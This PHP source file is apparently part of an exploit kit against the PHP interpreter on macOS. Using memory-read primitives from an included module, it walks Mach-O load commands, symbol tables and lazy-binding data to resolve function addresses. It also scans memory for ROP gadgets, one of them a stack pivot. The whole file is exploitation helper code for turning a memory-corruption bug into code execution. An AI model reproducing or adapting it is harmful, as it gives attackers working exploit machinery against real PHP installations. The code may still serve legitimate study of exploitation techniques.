<?

require_once('pm.php');
require_once('pm_rop_findexec_osx.php');

function gadget($addr,$gdgt) {
        $k=map($addr, 0x300000)[0];
        return $addr+(strpos($k,hex2bin($gdgt)));
}

function stackPivot($addr) {
	return gadget($addr,"500100005b415c415e415f5dc3");
}

function swapEndianness($hex) {
    return implode('', array_reverse(str_split($hex, 2)));
}

function r64($addr) {
	$n=read($addr,8);
	$val=hexdec(swapEndianness(bin2hex($n)));
	return $val;
}
function r32($addr) {
	$n=read($addr,4);
	$val=hexdec(swapEndianness(bin2hex($n)));
	return $val;
}
function rstr($addr) {
	$m=read($addr,0x300);
	$rt=substr($m,0,(strpos($m,"\0")));
	return $rt;
}
function r64_map($map,$off) {
	return r64($map['ptr']+$off);
}
function r32_map($map,$off) {
	return r32($map['ptr']+$off);
}
function rstr_map($map,$off) {
	return rstr($map['ptr']+$off);
}
function findsgmt($mh,$segname) {
	$lc=$mh+32;
	while ($lc < ($mh + r32($mh+20))) {
		if(r32($lc) == 0x19) {
			if($segname == rstr($lc+8)) {
				return $lc;
			}
		}
		$lc+=r32($lc+4);
	}
	return FALSE;
}
function findsect($sgmt, $name) {
	$sect=$sgmt+72;
	$i=0;
	while($i < r32($sgmt+64)) {
		if($name==rstr($sect)) return $sect;
		$sect+=80;
		$i++;
	}
	return FALSE;
}
function getlazybind($mh) {
        $lc=$mh+32;
        while ($lc < ($mh + r32($mh+20))) {
                if(r32($lc) == 0x80000022 /*LC_DYLD_INFO_ONLY*/) {
	                $sgmt=findsgmt($mh,"__LINKEDIT");
			$sgmt=r64($sgmt+0x18) & 0xffffffff;
			$sgmt=0x1D000;
			return [r32($lc+0x20)+$sgmt,r32($lc+0x24)];
                }
                $lc+=r32($lc+4);
        }
        return FALSE;
}
function findlazysym($mh,$name) {
	$w=getlazybind($mh);
	$i=0;
	for($by=0; $by<$w[1]; $i++) {
		$kv=rstr($mh + $w[0] + $by + 5);
		if(!ctype_print($kv)) {$i--; continue;}
		if($name==$kv)return $i;
		$by+=strlen($kv)+8;
	}
	return FALSE;
}
function getsymtabsym($mh,$name) {
        if(r32($mh) == 0xFEEDFACF){
	        $lc=$mh+32;
	        while ($lc < ($mh + r32($mh+20))) {
	                if(r32($lc) == 0x2) {
				$symoff=r32(8+$lc)+0x1D000+$mh;
				$nsyms=r32(12+$lc);
				$stroff=r32(16+$lc)+4+0x1D000+$mh;
				$strsize=r32(20+$lc);
				$k=0;
				for($i=0;$k<$nsyms;$i++) {
					$st=rstr($stroff+$k);
					if($st == $name) {
						$nlist=$symoff+($i*16);
						$val=r64($nlist+8) & 0xFFFFFFFF + $mh;
						return $val;
					}
					$k+=strlen($st)+1;
				}
	                }
	                $lc+=r32($lc+4);
	        }
	}
        return FALSE;
}

function getexport($mh,$name) {
        if(!$mh) return FALSE;
        if(r32($mh) == 0xFEEDFACF){
                $idx=getsymtabsym($mh,$name);
                if ($idx) return $idx;
	}
}
function getplt($mh,$name) {
	if(!$mh) return FALSE;
	if(r32($mh) == 0xFEEDFACF){
		$sgmt=findsgmt($mh,"__TEXT");
		if($sgmt===FALSE) return FALSE;
		$sect=(r32(findsect($sgmt,"__stubs")+0x30));
		$sect+=$mh;
		$idx=findlazysym($mh,$name);
		if($idx === FALSE) {
			return FALSE;
		}
		return $sect+(($idx)*6);
	}
	return FALSE;
}
function findmhfromaddr($a) {
	$a=$a&(~0xFF);
	for($i=0;$i<0x1000000;$i++) {
		if(r32($a) == 0xFEEDFACF) return $a;
		$a-=0x100;
	}
	return FALSE;
}
?>
